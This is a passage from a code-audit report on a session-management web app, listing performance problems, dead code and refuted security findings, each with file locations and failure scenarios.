useCockpit keeps all frame state in one hook (web/src/hooks/useCockpit.ts:187-345), so any frame — 'append' plus its paired 'raw-event' (server.js:2443-2452) at up to ~7Hz each while streaming, 'sessions' every 2s during activity (lib/sessions.js:121), 'resources' every 5s — re-renders App; SessionRail is a plain (non-memo) function component receiving a fresh inline onRequestMove arrow (App.tsx:2697-2700), so every render rebuilds every PaneRow (web/src/components/SessionRail.tsx:1127-1144) with its paneMetaFields compute, SlotText elements, and per-row effects.

**Failure scenario:** Operator with many panes (dozens of rows) while a session streams: ~14 App renders/sec, each re-rendering the full rail (and running the 3258-line App body). Row content rarely changes, but no memo boundary exists below App except Thread, so React reconciles the entire rail+header+gallery subtree continuously; on low-power devices this compounds the F1/F2 main-thread load into visible UI lag.

### [P2 · likely] 1.55MB single entry chunk (431KB gzip): xterm+WebGL, gsap, html-to-image all statically imported
`web/vite.config.ts:12`

The build emits one entry chunk (web/dist/assets/index-*.js = 1,551,972 bytes, ~431KB gzipped) with no manualChunks and zero React.lazy/dynamic imports outside highlight.js languages: xterm + fit/webgl/web-links addons are statically imported via XtermHost.tsx:2-6 ← Composer.tsx:31 (always in the tree), gsap via lib/anim.ts:2 ← SessionRail.tsx:4 (always mounted), html-to-image via ccBridgeRuntime.tsx:54 ← EmbeddedApp ← AppFrameLayer ← App.

**Failure scenario:** First load over Tailscale/mobile: the browser must download, parse, and evaluate 431KB gz of JS — including the terminal emulator, WebGL renderer, animation library, and DOM-screenshot library — before the rail/transcript is usable, even though terminal panes, studio, and app-capture are used in a small fraction of sessions. This exceeds the project's own 300KB app-page JS budget; on a cold mobile load it adds seconds to time-to-interactive.

### [P3 · possible] LivenessCache._map (and OlamOrgClient._pools) grow one entry per session ever seen and are never pruned
`lib/olam-liveness.js:46`

LivenessCache.get() (lib/olam-liveness.js:41-48) inserts a new _map entry per distinct olam:<org>:<sessionId> probed, but invalidate()/clear() have no production callers (only tests) — the only server.js call site is .get() — so the Map grows monotonically for the server's lifetime; the same pattern exists in OlamOrgClient._pools (lib/olam-client.js:447), which is likewise never pruned.

**Failure scenario:** A cockpit instance running for months against orgs whose planning sessions accumulate: each liveness probe of a distinct session adds a permanent {liveness, fetchedAt} entry and each enrich() adds a permanent pool entry. Individually tiny, but the Maps are unbounded by design with no TTL eviction — a slow, guaranteed leak proportional to total distinct remote sessions ever observed.

### [P3 · likely] Agent pane-size poll spawns a tmux exec every 2s per agent entry even with zero attached clients, with no overlap guard
`lib/pty-bridge.js:595`

setupAgentEntry starts a setInterval (DEFAULT_PANE_SIZE_POLL_MS=2000, line 134) that runs _paneSize(entry.target) — a tmux display-message execFile — whose only guard is entry.alive; after the last client detaches, the entry lives for the 30s idle grace (detachClient line 977) and keeps polling ~15 times for nobody, and because setInterval never awaits the async callback, a slow tmux socket stacks overlapping execs.

**Failure scenario:** A viewer opens an agent pane on a phone, then backgrounds the tab: the WS closes, the entry sits in idle grace for 30s still forking tmux display-message every 2s per entry (up to MAX_PTYS=4 entries = 2 execs/sec of pure waste); if the tmux server is momentarily busy and a poll exceeds 2s, overlapping display-message execs pile onto the same socket.

### [P3 · possible] listProcesses() uses execSync('ps -Ao ...') on a request path polled every 3s by the Process panel
`lib/resources.js:273`

GET /api/ps (server.js:441) calls listProcesses() which runs execSync with a 2s timeout — a synchronous subprocess spawn that blocks the entire event loop for the full ps duration; the SPA's ProcessPanel polls this endpoint every 3s (web/src/components/ProcessPanel.tsx POLL_MS=3000) while open.

**Failure scenario:** Operator leaves the Process panel open on a loaded machine where `ps -Ao pid,ppid,%cpu,%mem,rss,comm` takes 100ms-2s: every 3s the whole server (all WS broadcasts, transcript tailers, keystroke delivery for every session) freezes behind the synchronous exec, producing visible UI jank and delayed agent I/O for the duration.

### [P3 · likely] Synchronous filesystem scans (readdirSync/statSync/readSync/readFileSync) inside the 2s _pollThinking hot loop, per active session
`lib/sessions.js:1531`

_pollThinking() calls computeSubAgentActivity() (line 1531) and computeWorkflowActivity() (line 1541) synchronously for every active Claude/codex session every 2s; these do fs.readdirSync of the subagents/workflows dirs, one fs.statSync per accumulated agent-*.jsonl (subagents.js:341/361), openSync/readSync of new parent-transcript bytes (subagents.js:250-252), readFileSync of recent agent meta files (subagents.js:389), and readdirSync+statSync per workflow run (workflows.js:311/347/380) — all blocking the single event loop; the Promise.all wrapper gives no concurrency since the calls are sync.

**Failure scenario:** A long-lived session that 'accumulates hundreds' of subagent files (the code's own comment, subagents.js:356) plus many workflow run dirs (never pruned): every 2s tick pays a readdir of hundreds of entries + hundreds of statSync calls per active session, synchronously. With several concurrently-active agent sessions this is tens of ms of hard event-loop stall every 2s, landing exactly when sessions are busiest — adding latency jitter to every WS broadcast, keystroke, and HTTP request the server handles.

### [P3 · possible] 2s thinking poll runs synchronous readdirSync + per-file statSync over each active session's entire subagents dir
`lib/sessions.js:1531`

_pollThinking calls computeSubAgentActivity for every live Claude/Codex session every 2s; that function (lib/subagents.js:341) does fs.readdirSync on <transcript>/subagents/ then fs.statSync per agent-*.jsonl file (lib/subagents.js:361) — all synchronous on the event loop, and the FALLBACK_IDLE_MS age skip only applies AFTER paying the stat, so long-lived sessions that accumulated hundreds of historical agent files pay hundreds of blocking stats per session per tick.

**Failure scenario:** A session that has spawned 300 subagents over its life (the product's core use case) has 300 files in its subagents dir; while that session is active, every 2s tick statSyncs all 300 synchronously. With several such sessions live, each poll wave is thousands of blocking syscalls on the main thread, delaying pty output frames and input handling for every attached viewer.

### [P3 · likely] _maybeEmit JSON.stringifies the entire sessions array on every 2s/4s/12s poll tick and every registry event, then broadcast stringifies it again
`lib/sessions.js:1819`

_maybeEmit uses JSON.stringify(this._sessions) as its change-detection mechanism and is called unconditionally by _pollThinking (2s), _doRefresh (4s), _pollCtx (12s), setPending, setThinking, setPrompt, and setRemoteSessions; each session row embeds its full workflows run objects (line 1350), so the serialize is O(all sessions + workflow payload) on the main thread, and on an actual change server.js's broadcast() (server.js:2146-2148) JSON.stringifies the same payload a second time for fan-out.

**Failure scenario:** With 20-30 sessions and active workflow runs attached, each tick serializes a few hundred KB of session state 2-4x per second even when nothing changed, and every real change pays the same full serialize twice (once for dedup, once for the wire) — steady event-loop CPU and allocation churn that scales with total session count rather than with actual changes; a per-session dirty flag would eliminate nearly all of it.

### [P3 · likely] _pollCtx pays a duplicate tmux capture-pane per live pane every 12s although _pollThinking already cached the same screen <=2s earlier
`lib/sessions.js:1442`

_pollCtx spawns this._tmux.capturePane(s.target, 8) per live pane to parse model/ctx/effort from the TUI status line, but _pollThinking already captures the same pane's visible screen on its 2s cadence (line 1507) and stores it in this._paneTextCache (line 1522); the status line lives on the visible screen in both captures, so the ctx poll could parse the cached text instead of forking a second tmux exec per pane per cycle.

**Failure scenario:** With 10 live panes, the 12s ctx poll fires 10 extra capture-pane subprocesses that duplicate a capture the thinking poll performed at most 2s earlier and already handed to the fingerprint cache — a standing ~1 exec/sec of redundant tmux spawns on a busy server purely because the two pollers don't share their results.

### [P3 · likely] TranscriptTailer._initialLoad synchronously parses up to 8MB of JSONL on every new subscription
`lib/transcript.js:451`

On first subscribe (and on every tailer rebuild via server.js upgradeSubscriptionIfTranscriptReady, e.g. after resume/fork), _initialLoad() reads up to TAIL_MAX_BYTES=8MB and then runs a fully synchronous parse loop (lines 449-456: JSON.parse per line via this._parse) — with default maxBuffer=4000 only the tail is kept, but all ~8MB of lines are parsed first.

**Failure scenario:** A client opens (or reloads) a view on several large sessions in quick succession, or a resume/fork triggers upgradeSubscriptionIfTranscriptReady for watched sessions: each new tailer blocks the event loop for ~50-200ms parsing thousands of JSONL records, stalling every other connected client's append frames and keystroke handling during the burst.

### [P3 · possible] Collab /api/collab/read?wait=1 long-poll synchronously re-reads and re-parses the entire room log every 600ms for up to 25s
`server.js:1792`

The wait-loop (server.js:1788-1794) calls collab.read() every 600ms for up to COLLAB_WAIT_MS=25s; collab.read() calls _readLog() (lib/collab.js:126-143) which does a synchronous readFileSync of the whole append-only room JSONL plus a JSON.parse of every line — room logs are never rotated, truncated, or capped (lib/collab.js:_append is the only writer) — so cost grows unboundedly with room age, and concurrent waiters in the same room multiply it.

**Failure scenario:** Two agents in a long-lived collab room both poll read?wait=1: each waiter performs ~41 full-file readFileSync+parse-every-line passes per long-poll on the main event loop. After weeks of messages (log reaching MBs), every 600ms tick parses the whole log synchronously; overlapping waiters serialize into multi-hundred-ms event-loop stalls that delay all cockpit WS traffic, and the cost only increases the longer the room lives.

### [P3 · unlikely] ptyWss created without maxPayload (ws default 100MiB) while the main WSS caps at 1MB; incoming text frames are JSON.parse'd
`server.js:2079`

The main control WSS is created with maxPayload: 1MB (server.js:2071) but the PTY WebSocketServer one line later (server.js:2079) sets no maxPayload, so the ws default of 100MiB applies; lib/pty-bridge.js:1037 then runs JSON.parse(raw.toString()) on any text frame on the event loop.

**Failure scenario:** A buggy or malicious client that completes the (bearer-authenticated, localhost) PTY upgrade sends a ~100MiB text frame: the server buffers it, then JSON.parse blocks the event loop for seconds, freezing every session's transcript stream, keystroke path, and HTTP handler; repeated frames are a cheap local DoS of the whole control plane.

### [P3 · possible] Body-wide MutationObserver (attributes:true) re-arms a full-document querySelectorAll + geometry pass on every DOM mutation batch
`web/src/components/AppFrameLayer.tsx:1620`

The embed-tracker's MutationObserver on document.body with {childList:true, subtree:true, attributes:true} (AppFrameLayer.tsx:1620-1623) calls scheduleTick() for ANY attribute/child mutation anywhere in the app; each tick runs readSlotEls()'s full-document querySelectorAll('[data-embed-app-url]') (line 815-817) plus getBoundingClientRect per found placeholder (line 1185), and while any slot exists it also self-polls at 10Hz (line 1410-1411).

**Failure scenario:** Transcript streaming + attribute-animating components (SlotText rolls every 10s, gsap flashes, data-* state toggles, markdown DOM churn at ~7Hz): every mutation batch schedules an immediate full-document scan — with an embedded app present in the transcript this stacks on the 10Hz poll, so full-doc scans + layout reads run near-continuously during generation, adding layout/main-thread pressure on the exact frames that are already busy.

## Deadcode

### [P2 · likely] readCloudBearer called but never imported — /api/spawn-agents 500s on every claude-installed machine (proven live)
`server.js:591`

The /api/spawn-agents handler calls readCloudBearer() at lines 591 and 609, but server.js never imports it (line 20 imports only resolveClaudexBaseUrl and preflightClaudexModel from lib/cloud-bearer.js), so the ReferenceError is caught by the chain's .catch and returned as a 500.

**Failure scenario:** Any machine with the claude binary resolvable (claudeResult.available === true — the normal case for this tool's users): GET /api/spawn-agents throws ReferenceError: readCloudBearer is not defined → .catch returns HTTP 500 {error:"readCloudBearer is not defined"}. Proven live: curl against the operator's running :4317 instance returns exactly that body. The SPA's NewSessionDraft mounts fetchSpawnAgents() on every New Session open, catches the rejection as 'non-fatal', and the agent picker permanently loses availability/disabled-state and default-transport info — the claudex/claudemi availability feature path is effectively dead, and existing route tests only 'simulate what the handler builds' inline so they cannot catch it.

### [P2 · likely] PinModal is orphaned and drags the session-pin API helpers, Session.pinned, and pin-* CSS with it
`web/src/components/PinModal.tsx:29`

PinModal is imported nowhere; it is the sole consumer of lib/api.ts's listTranscripts/setPin/getPins/TranscriptInfo (lines 103-140) and the only reader of Session.pinned (lib/types.ts:19), so the whole manual-transcript-pin UI subtree is dead.

**Failure scenario:** Someone maintains the /api/pins client surface (getPins at api.ts:113, setPin at api.ts:121, listTranscripts at api.ts:139) and the pin-modal CSS at styles.css:2517-2545 believing the pin picker is reachable, but no UI can ever open it — the only mention of PinModal outside its own file is a comment in MoveWindowModal.tsx:24 — so refactors and server-endpoint changes are validated against a phantom consumer.

### [P2 · likely] useTerminalRelay hook has zero call sites
`web/src/hooks/useTerminalRelay.ts:22`

The 121-line useTerminalRelay hook (textarea-diff terminal input relay with sticky Ctrl/Opt) is not imported by any file in the repo and has no test file, making it entirely dead.

**Failure scenario:** A bug fix to the terminal input relay algorithm is applied to useTerminalRelay.ts (e.g. the sticky-modifier revert at lines 43-49) and assumed live, but the actual composer terminal path lives elsewhere, so the fix never ships and the duplicated logic silently diverges.

### [P3 · likely] getBoundary is a zero-caller exported function in collab-engine
`collab-engine/src/core/boundaries.ts:154`

Exported getBoundary(db, boundaryId) lookup helper has zero callers in the entire repo — not in mcp/tools.ts, not in cli/index.ts, and not in any test.

**Failure scenario:** A contributor refactoring the boundary store must keep getBoundary compiling and signature-compatible assuming it is exercised, but no MCP tool, CLI command, or test ever calls it — dead weight that can silently rot (e.g. a schema change to the boundaries table breaks it with no failing test to reveal it).

### [P3 · likely] getStream is a zero-caller exported function in collab-engine
`collab-engine/src/core/streams.ts:56`

Exported getStream(db, streamId) lookup helper has zero callers anywhere — MCP tools, CLI, and tests all use other functions from the module; this one is defined and never invoked.

**Failure scenario:** Same rot pattern as getBoundary: the streams table schema can change (migration in store/schema.ts) and getStream's mapStreamRow shape silently breaks with no caller or test to expose it, while contributors treat it as maintained public API of the core module.

### [P3 · likely] prettyModel export has zero callers anywhere (duplicate of tui.js's prettyModel)
`lib/codex.js:1077`

lib/codex.js exports its own prettyModel(modelId) pass-through ('Codex model ids are already human-readable'), but nothing imports it — lib/sessions.js imports prettyModel from ./tui.js (line 17) and codex.js never calls it internally; even the test suite only exercises tui.js's version.

**Failure scenario:** A future edit 'fixes' model-label formatting in codex.js's prettyModel expecting codex panes to pick it up; nothing changes at runtime because sessions.js resolves labels through tui.js's prettyModel, and the divergence between the two same-named functions confuses later readers about which one formats codex models.

### [P3 · likely] idleRecipients export has no production caller — server re-implements the idle filter inline
`lib/collab.js:67`

Exported idleRecipients(recipients, idlePaneIds) is called only by test/collab.test.js; the one place that needs it — server.js's /api/collab/send nudge loop (lines 1766-1779) — instead filters recipients inline with isIdleSession(s), so the shared helper and its pinned semantics are dead in production.

**Failure scenario:** Two definitions of 'idle peer' now exist: the tested idleRecipients helper and the server's inline isIdleSession predicate; a fix to idle-nudge semantics applied to the exported helper (the one with tests) would change nothing in production, leaving the collab send-nudge behavior stale while its test suite passes.

### [P3 · likely] hasActiveSubAgents is production-dead with a false docstring; keeps legacy RUNNING_WINDOW_MS alive
`lib/subagents.js:73`

Exported hasActiveSubAgents() (~30 lines) has zero production callers — lib/sessions.js imports only computeSubAgentActivity from this module — yet its docstring claims it is 'used by the session poll to light the rail's cloning state for EVERY window'; only test/subagents.test.js calls it, and the RUNNING_WINDOW_MS constant (line 32) exists solely for this dead function.

**Failure scenario:** A maintainer reads the docstring, believes the session poll depends on hasActiveSubAgents' mtime-window semantics, and preserves or tunes RUNNING_WINDOW_MS (45s) for a caller that does not exist; meanwhile the real rail-activity path (computeSubAgentActivity) drifts away from the tested-but-dead probe, so the tests give false confidence that the rail's cloning state is covered.

### [P3 · likely] CONFIG.projectsRoot set but never read — stale singular leftover from the multi-root migration
`server.js:118`

The CONFIG block assigns projectsRoot (env PROJECTS || ~/.claude/projects) at lines 118-119, but no code anywhere reads CONFIG.projectsRoot — SessionRegistry is constructed with projectsRoots (line 217), listRecentTranscripts uses CONFIG.projectsRoots (line 480), and validateTranscriptPath uses CONFIG.projectsRoots (line 1932); the only projectsRoot consumers are tests constructing SessionRegistry directly.

**Failure scenario:** An operator or contributor sees projectsRoot in CONFIG and assumes the singular root is consulted for transcript discovery, then debugs a 'missing session' against the wrong field; or a later edit reads CONFIG.projectsRoot (bypassing deriveProjectsRoots' multi-root/singleRoot logic) and silently drops secondary-root sessions.

### [P3 · likely] Dead export SCROLL_FADE_DURATION_MS with a false "vitest lockstep guard" doc comment
`web/src/components/AppFrameLayer.tsx:261`

Exported constant has zero references repo-wide (declaration only) while its doc comment (lines 256-260) claims a vitest suite asserts it stays in lockstep with the CSS opacity transition — no such test exists and git history shows one never did.

**Failure scenario:** A developer changes the CSS fade duration (or the JS constant) trusting the comment's promise that a vitest asserts lockstep — nothing fails, the two drift apart, and the fade timing the constant claims to canonicalize silently diverges from what actually runs.

### [P3 · likely] LivePane component and its entire support subtree are dead code
`web/src/components/LivePane.tsx:31`

LivePane is exported but imported nowhere in the repo (verified by full import-graph reachability from main.tsx and a repo-wide name grep), leaving its CSS, an unreachable querySelector fallback in App.tsx, and a dead scroller selector in usePullToRefresh.ts behind.

**Failure scenario:** A developer edits App.tsx:1371's `.live-pane` fallback or usePullToRefresh.ts:21's `.live-pane-body` scroller selector believing transcript-less sessions render a LivePane, but no component ever stamps `.live-pane`/`.live-pane-body` into the DOM, so the branch never runs; the orphaned styles.css rules at 1708-1740 (.live-pane*) and 10029-10060 (.live-pending*) keep shipping ~60 lines of CSS for a removed feature.

### [P3 · likely] lib/ansi.ts (SGR parser for the old composer terminal view) is unreferenced
`web/src/lib/ansi.ts:107`

parseAnsi/trimTrailingBlankLines/splitUrls in lib/ansi.ts have no importer outside their own vitest file; the file header says it exists for 'the composer terminal view', which is now the xterm-based XtermHost that does its own parsing.

**Failure scenario:** A rendering fix (e.g. xterm-256 color mapping at lines 29-40) is made in ansi.ts believing tmux capture-pane -e output flows through it, but no production code path calls parseAnsi, so the fix is inert and the 156-line module just adds bundle/repo weight.

### [P3 · likely] Orphaned IDLE_SETTLE export after settle-state refactor to primitives
`web/src/lib/answerSettle.ts:68`

Exported IDLE_SETTLE initial-state constant has zero references anywhere in the repo; the settle state it describes was refactored into separate primitives (App.tsx:1880 uses useState(false) directly), orphaning the constant.

**Failure scenario:** A future change to the answer-settle flow sees the exported IDLE_SETTLE 'canonical initial state' and wires new code to it while the live app initializes via separate useState primitives — two competing sources of truth for the same initial state, with the exported one silently disconnected from the running UI.

### [P3 · likely] lib/transcriptSearch.ts findMatches is dead; TranscriptSearch.tsx reimplements matching inline
`web/src/lib/transcriptSearch.ts:21`

findMatches is imported only by its own vitest file; components/TranscriptSearch.tsx (the only search UI) never imports it and instead implements its own matching on top of the CSS Custom Highlight API, so the tested helper and the shipped behavior are two divergent implementations.

**Failure scenario:** The matching semantics in the vitest-tested findMatches (non-overlapping, trim-guarded, case-insensitive indexOf loop, lines 21-38) drift from whatever TranscriptSearch.tsx actually does with CSS.highlights; the green test suite then certifies an algorithm nothing runs, and a 'fix the search bug' change lands in the wrong file.

### [P3 · likely] Orphaned CSS from superseded feature designs: .login-*/.hud-logout, dead .sa-* transcript cluster, .terminal-loading*
`web/src/styles.css:2462`

styles.css still ships rules for classes no TSX renders: .login-card/.login-title/.login-sub/.login-input/.login-err/.login-btn (2462-2503, TokenGate.tsx now uses gate-*), .hud-logout (2505), the old sub-agent transcript cluster .sa-summary/.sa-type/.sa-transcript/.sa-msg/.sa-msg-role/.sa-text/.sa-think/.sa-think-body/.sa-tool/.sa-tool-arg/.sa-result (~2800-2897; SubAgentPanel/SubAgentStrip use sa-panel/sa-dot/sa-desc instead), and .terminal-loading/.terminal-loading-spinner (9703-9718; TerminalView.tsx renders no loading element).

**Failure scenario:** A designer restyles .login-card or .sa-msg expecting the sign-in screen or sub-agent transcript to change, but those DOM nodes cannot exist — TokenGate renders .gate-card and the sub-agent drawer renders .sa-panel — so the edits are no-ops and the dead rules keep inflating the stylesheet and confusing audits.

### [P3 · likely] Scattered orphan CSS rules with zero class references anywhere in web/src
`web/src/styles.css:4799`

Nine more rules reference classes that appear in no TS/TSX source: .modal-plan (4799; plan reviews render .plan-review inside AskInline, not a .modal-plan dialog), .prompt-status (4888), .rail-gear plus its :hover/:focus-visible (5642-5666), .rail-new-form (5668; NewSessionForm.tsx uses rail-foot/rail-new), .detail-name-row (1671), .transcript-img (2410), .capture-output (5052; only the legacy public/ app uses that class and it has its own stylesheet), .terminal-pane-input and its child rule (1135-1150), and the descendant selector .subagent-strip-row .sa-dot (1091; SubAgentStrip renders subagent-pills, never subagent-strip-row).

**Failure scenario:** The reduced-motion block at styles.css:1091 (.subagent-strip-row .sa-dot { animation: none }) never matches because no element carries .subagent-strip-row, so a reader concludes reduced-motion handling exists for a strip layout that was removed; likewise .rail-new-form's sticky positioning (5668+) documents a form layout the current NewSessionForm no longer uses.

## Refuted (reported by a finder, killed by adversarial verification)

- **security** `web/src/components/UrlActionContext.tsx` — Inline URL preview frames arbitrary http(s) URLs — including same-origin ones — with sandbox="allow-scripts allow-same-origin"
- **security** `web/src/components/SessionRail.tsx` — Remote session prs[0].url rendered as href with no scheme validation (same javascript: XSS class as DeliveryCard; also App.tsx:2968)
- **security** `collab-engine/src/mcp/tools.ts` — No agent authentication: every 'owner-only' guard compares DB owner to a caller-supplied agent_id
- **correctness** `server.js` — ensureSubscription drift-recreate silently drops every other subscribed client
- **correctness** `lib/codex-rpc.js` — Answering 'Yes, and don't ask again' applies only the first of possibly several proposed network policy amendments
- **deadcode** `lib/optimize.js` — isRunawayRewrite has no production caller — thin test-only wrapper over evaluateRewrite
- **deadcode** `web/src/lib/pleri-ask/index.ts` — lib/pleri-ask/* (index, schema, nativeAdapter) is unreachable from the app entry point
- **deadcode** `server.js` — Dead `all: true` branch in /api/pins handler left over from removed "Re-match all" feature
